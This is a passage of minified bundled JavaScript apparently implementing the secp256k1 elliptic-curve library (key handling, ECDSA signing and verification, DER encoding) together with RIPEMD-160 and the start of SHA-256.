            const n = (t && t._WINDOW_SIZE) || 1;
            if (256 % n)
              throw new Error(
                "Point#wNAF: Invalid precomputation window, must be power of 2"
              );
            let r = t && ue.get(t);
            r ||
              ((r = this.precomputeWindow(n)),
              t && 1 !== n && ((r = ce.normalizeZ(r)), ue.set(t, r)));
            let i = ce.ZERO,
              o = ce.ZERO;
            const s = 1 + (le ? 128 / n : 256 / n),
              a = 2 ** (n - 1),
              l = BigInt(2 ** n - 1),
              c = 2 ** n,
              u = BigInt(n);
            for (let f = 0; f < s; f++) {
              const t = f * a;
              let n = Number(e & l);
              if (((e >>= u), n > a && ((n -= c), (e += te)), 0 === n)) {
                let e = r[t];
                f % 2 && (e = e.negate()), (o = o.add(e));
              } else {
                let e = r[t + Math.abs(n) - 1];
                n < 0 && (e = e.negate()), (i = i.add(e));
              }
            }
            return { p: i, f: o };
          }
          multiply(e, t) {
            let n,
              r,
              i = Te(e);
            if (le) {
              const { k1neg: e, k1: o, k2neg: s, k2: a } = _e(i);
              let { p: l, f: c } = this.wNAF(o, t),
                { p: u, f: f } = this.wNAF(a, t);
              e && (l = l.negate()),
                s && (u = u.negate()),
                (u = new ce(Ce(u.x * se.beta), u.y, u.z)),
                (n = l.add(u)),
                (r = c.add(f));
            } else {
              const { p: e, f: o } = this.wNAF(i, t);
              (n = e), (r = o);
            }
            return ce.normalizeZ([n, r])[0];
          }
          toAffine() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : Oe(this.z);
            const { x: t, y: n, z: r } = this,
              i = e,
              o = Ce(i * i),
              s = Ce(o * i),
              a = Ce(t * o),
              l = Ce(n * s);
            if (Ce(r * i) !== te) throw new Error("invZ was invalid");
            return new fe(a, l);
          }
        }
        (ce.BASE = new ce(se.Gx, se.Gy, te)), (ce.ZERO = new ce(ee, te, ee));
        const ue = new WeakMap();
        class fe {
          constructor(e, t) {
            (this.x = e), (this.y = t);
          }
          _setWindowSize(e) {
            (this._WINDOW_SIZE = e), ue.delete(this);
          }
          static fromCompressedHex(e) {
            const t = 32 === e.length,
              n = Ae(t ? e : e.subarray(1));
            if (!Le(n)) throw new Error("Point is not on curve");
            let r = (function (e) {
              const { P: t } = se,
                n = BigInt(6),
                r = BigInt(11),
                i = BigInt(22),
                o = BigInt(23),
                s = BigInt(44),
                a = BigInt(88),
                l = (e * e * e) % t,
                c = (l * l * e) % t,
                u = (Ie(c, re) * c) % t,
                f = (Ie(u, re) * c) % t,
                h = (Ie(f, ne) * l) % t,
                d = (Ie(h, r) * h) % t,
                p = (Ie(d, i) * d) % t,
                g = (Ie(p, s) * p) % t,
                y = (Ie(g, a) * g) % t,
                w = (Ie(y, s) * p) % t,
                m = (Ie(w, re) * c) % t,
                b = (Ie(m, o) * d) % t,
                v = (Ie(b, n) * l) % t;
              return Ie(v, ne);
            })(ae(n));
            const i = (r & te) === te;
            if (t) i && (r = Ce(-r));
            else {
              (1 === (1 & e[0])) !== i && (r = Ce(-r));
            }
            const o = new fe(n, r);
            return o.assertValidity(), o;
          }
          static fromUncompressedHex(e) {
            const t = Ae(e.subarray(1, 33)),
              n = Ae(e.subarray(33, 65)),
              r = new fe(t, n);
            return r.assertValidity(), r;
          }
          static fromHex(e) {
            const t = ke(e),
              n = t.length,
              r = t[0];
            if (32 === n || (33 === n && (2 === r || 3 === r)))
              return this.fromCompressedHex(t);
            if (65 === n && 4 === r) return this.fromUncompressedHex(t);
            throw new Error(
              `Point.fromHex: received invalid point. Expected 32-33 compressed bytes or 65 uncompressed bytes, not ${n}`
            );
          }
          static fromPrivateKey(e) {
            return fe.BASE.multiply(He(e));
          }
          static fromSignature(e, t, n) {
            const r = Ue((e = ke(e))),
              { r: i, s: o } = Me(t);
            if (0 !== n && 1 !== n)
              throw new Error("Cannot recover signature: invalid recovery bit");
            const s = 1 & n ? "03" : "02",
              a = fe.fromHex(s + be(i)),
              { n: l } = se,
              c = Oe(i, l),
              u = Ce(-r * c, l),
              f = Ce(o * c, l),
              h = fe.BASE.multiplyAndAddUnsafe(a, u, f);
            if (!h)
              throw new Error("Cannot recover signature: point at infinify");
            return h.assertValidity(), h;
          }
          toRawBytes() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return xe(this.toHex(e));
          }
          toHex() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            const t = be(this.x);
            if (e) {
              return `${this.y & te ? "03" : "02"}${t}`;
            }
            return `04${t}${be(this.y)}`;
          }
          toHexX() {
            return this.toHex(!0).slice(2);
          }
          toRawX() {
            return this.toRawBytes(!0).slice(1);
          }
          assertValidity() {
            const e = "Point is not on elliptic curve",
              { x: t, y: n } = this;
            if (!Le(t) || !Le(n)) throw new Error(e);
            const r = Ce(n * n);
            if (Ce(r - ae(t)) !== ee) throw new Error(e);
          }
          equals(e) {
            return this.x === e.x && this.y === e.y;
          }
          negate() {
            return new fe(this.x, Ce(-this.y));
          }
          double() {
            return ce.fromAffine(this).double().toAffine();
          }
          add(e) {
            return ce.fromAffine(this).add(ce.fromAffine(e)).toAffine();
          }
          subtract(e) {
            return this.add(e.negate());
          }
          multiply(e) {
            return ce.fromAffine(this).multiply(e, this).toAffine();
          }
          multiplyAndAddUnsafe(e, t, n) {
            const r = ce.fromAffine(this),
              i =
                t === ee || t === te || this !== fe.BASE
                  ? r.multiplyUnsafe(t)
                  : r.multiply(t),
              o = ce.fromAffine(e).multiplyUnsafe(n),
              s = i.add(o);
            return s.equals(ce.ZERO) ? void 0 : s.toAffine();
          }
        }
        function he(e) {
          return Number.parseInt(e[0], 16) >= 8 ? "00" + e : e;
        }
        function de(e) {
          if (e.length < 2 || 2 !== e[0])
            throw new Error(`Invalid signature integer tag: ${me(e)}`);
          const t = e[1],
            n = e.subarray(2, t + 2);
          if (!t || n.length !== t)
            throw new Error("Invalid signature integer: wrong length");
          if (0 === n[0] && n[1] <= 127)
            throw new Error("Invalid signature integer: trailing length");
          return { data: Ae(n), left: e.subarray(t + 2) };
        }
        (fe.BASE = new fe(se.Gx, se.Gy)), (fe.ZERO = new fe(ee, ee));
        class pe {
          constructor(e, t) {
            (this.r = e), (this.s = t), this.assertValidity();
          }
          static fromCompact(e) {
            const t = ye(e),
              n = "Signature.fromCompact";
            if ("string" !== typeof e && !t)
              throw new TypeError(`${n}: Expected string or Uint8Array`);
            const r = t ? me(e) : e;
            if (128 !== r.length) throw new Error(`${n}: Expected 64-byte hex`);
            return new pe(Se(r.slice(0, 64)), Se(r.slice(64, 128)));
          }
          static fromDER(e) {
            const t = ye(e);
            if ("string" !== typeof e && !t)
              throw new TypeError(
                "Signature.fromDER: Expected string or Uint8Array"
              );
            const { r: n, s: r } = (function (e) {
              if (e.length < 2 || 48 != e[0])
                throw new Error(`Invalid signature tag: ${me(e)}`);
              if (e[1] !== e.length - 2)
                throw new Error("Invalid signature: incorrect length");
              const { data: t, left: n } = de(e.subarray(2)),
                { data: r, left: i } = de(n);
              if (i.length)
                throw new Error(
                  `Invalid signature: left bytes after parsing: ${me(i)}`
                );
              return { r: t, s: r };
            })(t ? e : xe(e));
            return new pe(n, r);
          }
          static fromHex(e) {
            return this.fromDER(e);
          }
          assertValidity() {
            const { r: e, s: t } = this;
            if (!Re(e))
              throw new Error("Invalid Signature: r must be 0 < r < n");
            if (!Re(t))
              throw new Error("Invalid Signature: s must be 0 < s < n");
          }
          hasHighS() {
            const e = se.n >> te;
            return this.s > e;
          }
          normalizeS() {
            return this.hasHighS() ? new pe(this.r, se.n - this.s) : this;
          }
          toDERRawBytes() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return xe(this.toDERHex(e));
          }
          toDERHex() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            const t = he(Ee(this.s));
            if (e) return t;
            const n = he(Ee(this.r)),
              r = Ee(n.length / 2),
              i = Ee(t.length / 2);
            return `30${Ee(
              n.length / 2 + t.length / 2 + 4
            )}02${r}${n}02${i}${t}`;
          }
          toRawBytes() {
            return this.toDERRawBytes();
          }
          toHex() {
            return this.toDERHex();
          }
          toCompactRawBytes() {
            return xe(this.toCompactHex());
          }
          toCompactHex() {
            return be(this.r) + be(this.s);
          }
        }
        function ge() {
          for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
          if (!t.every(ye)) throw new Error("Uint8Array list expected");
          if (1 === t.length) return t[0];
          const r = t.reduce((e, t) => e + t.length, 0),
            i = new Uint8Array(r);
          for (let o = 0, s = 0; o < t.length; o++) {
            const e = t[o];
            i.set(e, s), (s += e.length);
          }
          return i;
        }
        function ye(e) {
          return e instanceof Uint8Array;
        }
        const we = Array.from({ length: 256 }, (e, t) =>
          t.toString(16).padStart(2, "0")
        );
        function me(e) {
          if (!(e instanceof Uint8Array))
            throw new Error("Expected Uint8Array");
          let t = "";
          for (let n = 0; n < e.length; n++) t += we[e[n]];
          return t;
        }
        function be(e) {
          if (e > oe) throw new Error("Expected number < 2^256");
          return e.toString(16).padStart(64, "0");
        }
        function ve(e) {
          return xe(be(e));
        }
        function Ee(e) {
          const t = e.toString(16);
          return 1 & t.length ? `0${t}` : t;
        }
        function Se(e) {
          if ("string" !== typeof e)
            throw new TypeError(
              "hexToNumber: expected string, got " + typeof e
            );
          return BigInt(`0x${e}`);
        }
        function xe(e) {
          if ("string" !== typeof e)
            throw new TypeError("hexToBytes: expected string, got " + typeof e);
          if (e.length % 2)
            throw new Error(
              "hexToBytes: received invalid unpadded hex" + e.length
            );
          const t = new Uint8Array(e.length / 2);
          for (let n = 0; n < t.length; n++) {
            const r = 2 * n,
              i = e.slice(r, r + 2),
              o = Number.parseInt(i, 16);
            if (Number.isNaN(o) || o < 0)
              throw new Error("Invalid byte sequence");
            t[n] = o;
          }
          return t;
        }
        function Ae(e) {
          return Se(me(e));
        }
        function ke(e) {
          return e instanceof Uint8Array ? Uint8Array.from(e) : xe(e);
        }
        function Te(e) {
          if ("number" === typeof e && Number.isSafeInteger(e) && e > 0)
            return BigInt(e);
          if ("bigint" === typeof e && Re(e)) return e;
          throw new TypeError(
            "Expected valid private scalar: 0 < scalar < curve.n"
          );
        }
        function Ce(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : se.P;
          const n = e % t;
          return n >= ee ? n : t + n;
        }
        function Ie(e, t) {
          const { P: n } = se;
          let r = e;
          for (; t-- > ee; ) (r *= r), (r %= n);
          return r;
        }
        function Oe(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : se.P;
          if (e === ee || t <= ee)
            throw new Error(
              `invert: expected positive integers, got n=${e} mod=${t}`
            );
          let n = Ce(e, t),
            r = t,
            i = ee,
            o = te,
            s = te,
            a = ee;
          for (; n !== ee; ) {
            const e = r / n,
              t = r % n,
              l = i - s * e,
              c = o - a * e;
            (r = n), (n = t), (i = s), (o = a), (s = l), (a = c);
          }
          if (r !== te) throw new Error("invert: does not exist");
          return Ce(i, t);
        }
        const Be = (e, t) => (e + t / ne) / t,
          Pe = ne ** BigInt(128);
        function _e(e) {
          const { n: t } = se,
            n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
            r = -te * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
            i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
            o = n,
            s = Be(o * e, t),
            a = Be(-r * e, t);
          let l = Ce(e - s * n - a * i, t),
            c = Ce(-s * r - a * o, t);
          const u = l > Pe,
            f = c > Pe;
          if ((u && (l = t - l), f && (c = t - c), l > Pe || c > Pe))
            throw new Error("splitScalarEndo: Endomorphism failed, k=" + e);
          return { k1neg: u, k1: l, k2neg: f, k2: c };
        }
        function Ue(e) {
          const { n: t } = se,
            n = 8 * e.length - 256;
          let r = Ae(e);
          return n > 0 && (r >>= BigInt(n)), r >= t && (r -= t), r;
        }
        class Ne {
          constructor() {
            (this.v = new Uint8Array(32).fill(1)),
              (this.k = new Uint8Array(32).fill(0)),
              (this.counter = 0);
          }
          hmac() {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
              t[n] = arguments[n];
            return et.hmacSha256(this.k, ...t);
          }
          hmacSync() {
            if ("function" !== typeof et.hmacSha256Sync)
              throw new Error(
                "utils.hmacSha256Sync is undefined, you need to set it"
              );
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
              t[n] = arguments[n];
            const r = et.hmacSha256Sync(this.k, ...t);
            if (r instanceof Promise)
              throw new Error(
                "To use sync sign(), ensure utils.hmacSha256 is sync"
              );
            return r;
          }
          incr() {
            if (this.counter >= 1e3)
              throw new Error(
                "Tried 1,000 k values for sign(), all were invalid"
              );
            this.counter += 1;
          }
          async reseed() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : new Uint8Array();
            (this.k = await this.hmac(this.v, Uint8Array.from([0]), e)),
              (this.v = await this.hmac(this.v)),
              0 !== e.length &&
                ((this.k = await this.hmac(this.v, Uint8Array.from([1]), e)),
                (this.v = await this.hmac(this.v)));
          }
          reseedSync() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : new Uint8Array();
            (this.k = this.hmacSync(this.v, Uint8Array.from([0]), e)),
              (this.v = this.hmacSync(this.v)),
              0 !== e.length &&
                ((this.k = this.hmacSync(this.v, Uint8Array.from([1]), e)),
                (this.v = this.hmacSync(this.v)));
          }
          async generate() {
            return this.incr(), (this.v = await this.hmac(this.v)), this.v;
          }
          generateSync() {
            return this.incr(), (this.v = this.hmacSync(this.v)), this.v;
          }
        }
        function Re(e) {
          return ee < e && e < se.n;
        }
        function Le(e) {
          return ee < e && e < se.P;
        }
        function $e(e, t, n) {
          const r = Ae(e);
          if (!Re(r)) return;
          const { n: i } = se,
            o = fe.BASE.multiply(r),
            s = Ce(o.x, i);
          if (s === ee) return;
          const a = Ce(Oe(r, i) * Ce(t + n * s, i), i);
          if (a === ee) return;
          const l = new pe(s, a);
          return { sig: l, recovery: (o.x === l.r ? 0 : 2) | Number(o.y & te) };
        }
        function He(e) {
          let t;
          if ("bigint" === typeof e) t = e;
          else if ("number" === typeof e && Number.isSafeInteger(e) && e > 0)
            t = BigInt(e);
          else if ("string" === typeof e) {
            if (64 !== e.length)
              throw new Error("Expected 32 bytes of private key");
            t = Se(e);
          } else {
            if (!ye(e)) throw new TypeError("Expected valid private key");
            if (32 !== e.length)
              throw new Error("Expected 32 bytes of private key");
            t = Ae(e);
          }
          if (!Re(t)) throw new Error("Expected private key: 0 < key < n");
          return t;
        }
        function De(e) {
          return e instanceof fe ? (e.assertValidity(), e) : fe.fromHex(e);
        }
        function Me(e) {
          if (e instanceof pe) return e.assertValidity(), e;
          try {
            return pe.fromDER(e);
          } catch (t) {
            return pe.fromCompact(e);
          }
        }
        function Fe(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          return fe.fromPrivateKey(e).toRawBytes(t);
        }
        function je(e) {
          const t = ye(e),
            n = "string" === typeof e,
            r = (t || n) && e.length;
          return t
            ? 33 === r || 65 === r
            : n
            ? 66 === r || 130 === r
            : e instanceof fe;
        }
        function ze(e, t) {
          let n =
            arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
          if (je(e))
            throw new TypeError(
              "getSharedSecret: first arg must be private key"
            );
          if (!je(t))
            throw new TypeError(
              "getSharedSecret: second arg must be public key"
            );
          const r = De(t);
          return r.assertValidity(), r.multiply(He(e)).toRawBytes(n);
        }
        function Ke(e) {
          return Ae(e.length > 32 ? e.slice(0, 32) : e);
        }
        function We(e) {
          const t = Ke(e),
            n = Ce(t, se.n);
          return Ve(n < ee ? t : n);
        }
        function Ve(e) {
          if ("bigint" !== typeof e) throw new Error("Expected bigint");
          return xe(be(e));
        }
        function qe(e, t, n) {
          if (null == e)
            throw new Error(`sign: expected valid message hash, not "${e}"`);
          const r = ke(e),
            i = He(t),
            o = [Ve(i), We(r)];
          if (null != n) {
            !0 === n && (n = et.randomBytes(32));
            const e = ke(n);
            if (32 !== e.length)
              throw new Error("sign: Expected 32 bytes of extra data");
            o.push(e);
          }
          return { seed: ge(...o), m: Ke(r), d: i };
        }
        function Ge(e, t) {
          let { sig: n, recovery: r } = e;
          const {
            canonical: i,
            der: o,
            recovered: s,
          } = Object.assign({ canonical: !0, der: !0 }, t);
          i && n.hasHighS() && ((n = n.normalizeS()), (r ^= 1));
          const a = o ? n.toDERRawBytes() : n.toCompactRawBytes();
          return s ? [a, r] : a;
        }
        async function Ye(e, t) {
          let n =
            arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
          const { seed: r, m: i, d: o } = qe(e, t, n.extraEntropy);
          let s;
          const a = new Ne();
          for (await a.reseed(r); !(s = $e(await a.generate(), i, o)); )
            await a.reseed();
          return Ge(s, n);
        }
        const Ze = { strict: !0 };
        function Je(e, t, n) {
          let r,
            i =
              arguments.length > 3 && void 0 !== arguments[3]
                ? arguments[3]
                : Ze;
          try {
            (r = Me(e)), (t = ke(t));
          } catch (p) {
            return !1;
          }
          const { r: o, s: s } = r;
          if (i.strict && r.hasHighS()) return !1;
          const a = Ue(t);
          let l;
          try {
            l = De(n);
          } catch (p) {
            return !1;
          }
          const { n: c } = se,
            u = Oe(s, c),
            f = Ce(a * u, c),
            h = Ce(o * u, c),
            d = fe.BASE.multiplyAndAddUnsafe(l, f, h);
          if (!d) return !1;
          return Ce(d.x, c) === o;
        }
        fe.BASE._setWindowSize(8);
        const Xe = {
            node: Q,
            web:
              "object" === typeof self && "crypto" in self
                ? self.crypto
                : void 0,
          },
          Qe = {},
          et = {
            isValidPrivateKey(e) {
              try {
                return He(e), !0;
              } catch (t) {
                return !1;
              }
            },
            privateAdd: (e, t) => ve(Ce(He(e) + He(t), se.n)),
            privateNegate: (e) => {
              const t = He(e);
              return ve(se.n - t);
            },
            pointAddScalar: (e, t, n) => {
              const r = fe.fromHex(e),
                i = He(t),
                o = fe.BASE.multiplyAndAddUnsafe(r, i, te);
              if (!o) throw new Error("Tweaked point at infinity");
              return o.toRawBytes(n);
            },
            pointMultiply: (e, t, n) => {
              const r = fe.fromHex(e),
                i = Ae(ke(t));
              return r.multiply(i).toRawBytes(n);
            },
            hashToPrivateKey: (e) => {
              if ((e = ke(e)).length < 40 || e.length > 1024)
                throw new Error(
                  "Expected 40-1024 bytes of private key as per FIPS 186"
                );
              return ve(Ce(Ae(e), se.n - te) + te);
            },
            randomBytes: function () {
              let e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : 32;
              if (Xe.web) return Xe.web.getRandomValues(new Uint8Array(e));
              if (Xe.node) {
                const { randomBytes: t } = Xe.node;
                return Uint8Array.from(t(e));
              }
              throw new Error(
                "The environment doesn't have randomBytes function"
              );
            },
            randomPrivateKey: () => et.hashToPrivateKey(et.randomBytes(40)),
            bytesToHex: me,
            hexToBytes: xe,
            concatBytes: ge,
            mod: Ce,
            invert: Oe,
            sha256: async function () {
              for (
                var e = arguments.length, t = new Array(e), n = 0;
                n < e;
                n++
              )
                t[n] = arguments[n];
              if (Xe.web) {
                const e = await Xe.web.subtle.digest("SHA-256", ge(...t));
                return new Uint8Array(e);
              }
              if (Xe.node) {
                const { createHash: e } = Xe.node,
                  n = e("sha256");
                return (
                  t.forEach((e) => n.update(e)), Uint8Array.from(n.digest())
                );
              }
              throw new Error("The environment doesn't have sha256 function");
            },
            hmacSha256: async function (e) {
              for (
                var t = arguments.length,
                  n = new Array(t > 1 ? t - 1 : 0),
                  r = 1;
                r < t;
                r++
              )
                n[r - 1] = arguments[r];
              if (Xe.web) {
                const t = await Xe.web.subtle.importKey(
                    "raw",
                    e,
                    { name: "HMAC", hash: { name: "SHA-256" } },
                    !1,
                    ["sign"]
                  ),
                  r = ge(...n),
                  i = await Xe.web.subtle.sign("HMAC", t, r);
                return new Uint8Array(i);
              }
              if (Xe.node) {
                const { createHmac: t } = Xe.node,
                  r = t("sha256", e);
                return (
                  n.forEach((e) => r.update(e)), Uint8Array.from(r.digest())
                );
              }
              throw new Error(
                "The environment doesn't have hmac-sha256 function"
              );
            },
            sha256Sync: void 0,
            hmacSha256Sync: void 0,
            taggedHash: async function (e) {
              let t = Qe[e];
              if (void 0 === t) {
                const n = await et.sha256(
                  Uint8Array.from(e, (e) => e.charCodeAt(0))
                );
                (t = ge(n, n)), (Qe[e] = t);
              }
              for (
                var n = arguments.length,
                  r = new Array(n > 1 ? n - 1 : 0),
                  i = 1;
                i < n;
                i++
              )
                r[i - 1] = arguments[i];
              return et.sha256(t, ...r);
            },
            taggedHashSync: function (e) {
              if ("function" !== typeof et.sha256Sync)
                throw new Error(
                  "utils.sha256Sync is undefined, you need to set it"
                );
              let t = Qe[e];
              if (void 0 === t) {
                const n = et.sha256Sync(
                  Uint8Array.from(e, (e) => e.charCodeAt(0))
                );
                (t = ge(n, n)), (Qe[e] = t);
              }
              for (
                var n = arguments.length,
                  r = new Array(n > 1 ? n - 1 : 0),
                  i = 1;
                i < n;
                i++
              )
                r[i - 1] = arguments[i];
              return et.sha256Sync(t, ...r);
            },
            precompute() {
              let e =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : 8,
                t =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : fe.BASE;
              const n = t === fe.BASE ? t : new fe(t.x, t.y);
              return n._setWindowSize(e), n.multiply(re), n;
            },
          };
        function tt(e) {
          if (!Number.isSafeInteger(e) || e < 0)
            throw new Error(`Wrong positive integer: ${e}`);
        }
        function nt(e) {
          if (!(e instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
          for (
            var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
            r < t;
            r++
          )
            n[r - 1] = arguments[r];
          if (n.length > 0 && !n.includes(e.length))
            throw new TypeError(
              `Expected Uint8Array of length ${n}, not of length=${e.length}`
            );
        }
        const rt = {
            number: tt,
            bool: function (e) {
              if ("boolean" !== typeof e)
                throw new Error(`Expected boolean, not ${e}`);
            },
            bytes: nt,
            hash: function (e) {
              if ("function" !== typeof e || "function" !== typeof e.create)
                throw new Error(
                  "Hash should be wrapped by utils.wrapConstructor"
                );
              tt(e.outputLen), tt(e.blockLen);
            },
            exists: function (e) {
              let t =
                !(arguments.length > 1 && void 0 !== arguments[1]) ||
                arguments[1];
              if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
              if (t && e.finished)
                throw new Error("Hash#digest() has already been called");
            },
            output: function (e, t) {
              nt(e);
              const n = t.outputLen;
              if (e.length < n)
                throw new Error(
                  `digestInto() expects output buffer of length at least ${n}`
                );
            },
          },
          it = rt,
          ot =
            ("object" === typeof self && "crypto" in self && self.crypto,
            (e) => new DataView(e.buffer, e.byteOffset, e.byteLength)),
          st = (e, t) => (e << (32 - t)) | (e >>> t);
        if (!(68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0]))
          throw new Error("Non little-endian hardware is not supported");
        Array.from({ length: 256 }, (e, t) => t.toString(16).padStart(2, "0"));
        function at(e) {
          if ("string" !== typeof e)
            throw new TypeError("utf8ToBytes expected string, got " + typeof e);
          return new TextEncoder().encode(e);
        }
        function lt(e) {
          if (
            ("string" === typeof e && (e = at(e)), !(e instanceof Uint8Array))
          )
            throw new TypeError(
              `Expected input type is Uint8Array (got ${typeof e})`
            );
          return e;
        }
        class ct {
          clone() {
            return this._cloneInto();
          }
        }
        function ut(e) {
          const t = (t) => e().update(lt(t)).digest(),
            n = e();
          return (
            (t.outputLen = n.outputLen),
            (t.blockLen = n.blockLen),
            (t.create = () => e()),
            t
          );
        }
        class ft extends ct {
          constructor(e, t, n, r) {
            super(),
              (this.blockLen = e),
              (this.outputLen = t),
              (this.padOffset = n),
              (this.isLE = r),
              (this.finished = !1),
              (this.length = 0),
              (this.pos = 0),
              (this.destroyed = !1),
              (this.buffer = new Uint8Array(e)),
              (this.view = ot(this.buffer));
          }
          update(e) {
            it.exists(this);
            const { view: t, buffer: n, blockLen: r } = this,
              i = (e = lt(e)).length;
            for (let o = 0; o < i; ) {
              const s = Math.min(r - this.pos, i - o);
              if (s !== r)
                n.set(e.subarray(o, o + s), this.pos),
                  (this.pos += s),
                  (o += s),
                  this.pos === r && (this.process(t, 0), (this.pos = 0));
              else {
                const t = ot(e);
                for (; r <= i - o; o += r) this.process(t, o);
              }
            }
            return (this.length += e.length), this.roundClean(), this;
          }
          digestInto(e) {
            it.exists(this), it.output(e, this), (this.finished = !0);
            const { buffer: t, view: n, blockLen: r, isLE: i } = this;
            let { pos: o } = this;
            (t[o++] = 128),
              this.buffer.subarray(o).fill(0),
              this.padOffset > r - o && (this.process(n, 0), (o = 0));
            for (let a = o; a < r; a++) t[a] = 0;
            !(function (e, t, n, r) {
              if ("function" === typeof e.setBigUint64)
                return e.setBigUint64(t, n, r);
              const i = BigInt(32),
                o = BigInt(4294967295),
                s = Number((n >> i) & o),
                a = Number(n & o),
                l = r ? 4 : 0,
                c = r ? 0 : 4;
              e.setUint32(t + l, s, r), e.setUint32(t + c, a, r);
            })(n, r - 8, BigInt(8 * this.length), i),
              this.process(n, 0);
            const s = ot(e);
            this.get().forEach((e, t) => s.setUint32(4 * t, e, i));
          }
          digest() {
            const { buffer: e, outputLen: t } = this;
            this.digestInto(e);
            const n = e.slice(0, t);
            return this.destroy(), n;
          }
          _cloneInto(e) {
            e || (e = new this.constructor()), e.set(...this.get());
            const {
              blockLen: t,
              buffer: n,
              length: r,
              finished: i,
              destroyed: o,
              pos: s,
            } = this;
            return (
              (e.length = r),
              (e.pos = s),
              (e.finished = i),
              (e.destroyed = o),
              r % t && e.buffer.set(n),
              e
            );
          }
        }
        const ht = new Uint8Array([
            7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8,
          ]),
          dt = Uint8Array.from({ length: 16 }, (e, t) => t),
          pt = dt.map((e) => (9 * e + 5) % 16);
        let gt = [dt],
          yt = [pt];
        for (let Mo = 0; Mo < 4; Mo++)
          for (let e of [gt, yt]) e.push(e[Mo].map((e) => ht[e]));
        const wt = [
            [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8],
            [12, 13, 11, 15, 6, 9, 9, 7, 12, 15, 11, 13, 7, 8, 7, 7],
            [13, 15, 14, 11, 7, 7, 6, 8, 13, 14, 13, 12, 5, 5, 6, 9],
            [14, 11, 12, 14, 8, 6, 5, 5, 15, 12, 15, 14, 9, 9, 8, 6],
            [15, 12, 13, 13, 9, 5, 8, 6, 14, 11, 12, 11, 8, 6, 5, 5],
          ].map((e) => new Uint8Array(e)),
          mt = gt.map((e, t) => e.map((e) => wt[t][e])),
          bt = yt.map((e, t) => e.map((e) => wt[t][e])),
          vt = new Uint32Array([
            0, 1518500249, 1859775393, 2400959708, 2840853838,
          ]),
          Et = new Uint32Array([
            1352829926, 1548603684, 1836072691, 2053994217, 0,
          ]),
          St = (e, t) => (e << t) | (e >>> (32 - t));
        function xt(e, t, n, r) {
          return 0 === e
            ? t ^ n ^ r
            : 1 === e
            ? (t & n) | (~t & r)
            : 2 === e
            ? (t | ~n) ^ r
            : 3 === e
            ? (t & r) | (n & ~r)
            : t ^ (n | ~r);
        }
        const At = new Uint32Array(16);
        class kt extends ft {
          constructor() {
            super(64, 20, 8, !0),
              (this.h0 = 1732584193),
              (this.h1 = -271733879),
              (this.h2 = -1732584194),
              (this.h3 = 271733878),
              (this.h4 = -1009589776);
          }
          get() {
            const { h0: e, h1: t, h2: n, h3: r, h4: i } = this;
            return [e, t, n, r, i];
          }
          set(e, t, n, r, i) {
            (this.h0 = 0 | e),
              (this.h1 = 0 | t),
              (this.h2 = 0 | n),
              (this.h3 = 0 | r),
              (this.h4 = 0 | i);
          }
          process(e, t) {
            for (let h = 0; h < 16; h++, t += 4) At[h] = e.getUint32(t, !0);
            let n = 0 | this.h0,
              r = n,
              i = 0 | this.h1,
              o = i,
              s = 0 | this.h2,
              a = s,
              l = 0 | this.h3,
              c = l,
              u = 0 | this.h4,
              f = u;
            for (let h = 0; h < 5; h++) {
              const e = 4 - h,
                t = vt[h],
                d = Et[h],
                p = gt[h],
                g = yt[h],
                y = mt[h],
                w = bt[h];
              for (let r = 0; r < 16; r++) {
                const e = (St(n + xt(h, i, s, l) + At[p[r]] + t, y[r]) + u) | 0;
                (n = u), (u = l), (l = 0 | St(s, 10)), (s = i), (i = e);
              }
              for (let n = 0; n < 16; n++) {
                const t = (St(r + xt(e, o, a, c) + At[g[n]] + d, w[n]) + f) | 0;
                (r = f), (f = c), (c = 0 | St(a, 10)), (a = o), (o = t);
              }
            }
            this.set(
              (this.h1 + s + c) | 0,
              (this.h2 + l + f) | 0,
              (this.h3 + u + r) | 0,
              (this.h4 + n + o) | 0,
              (this.h0 + i + a) | 0
            );
          }
          roundClean() {
            At.fill(0);
          }
          destroy() {
            (this.destroyed = !0), this.buffer.fill(0), this.set(0, 0, 0, 0, 0);
          }
        }
        const Tt = ut(() => new kt()),
          Ct = (e, t, n) => (e & t) ^ (~e & n),
          It = (e, t, n) => (e & t) ^ (e & n) ^ (t & n),
          Ot = new Uint32Array([
            1116352408, 1899447441, 3049323471, 3921009573, 961987163,
            1508970993, 2453635748, 2870763221, 3624381080, 310598401,
            607225278, 1426881987, 1925078388, 2162078206, 2614888103,
            3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983,
            1249150122, 1555081692, 1996064986, 2554220882, 2821834349,
            2952996808, 3210313671, 3336571891, 3584528711, 113926993,
            338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700,
            1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
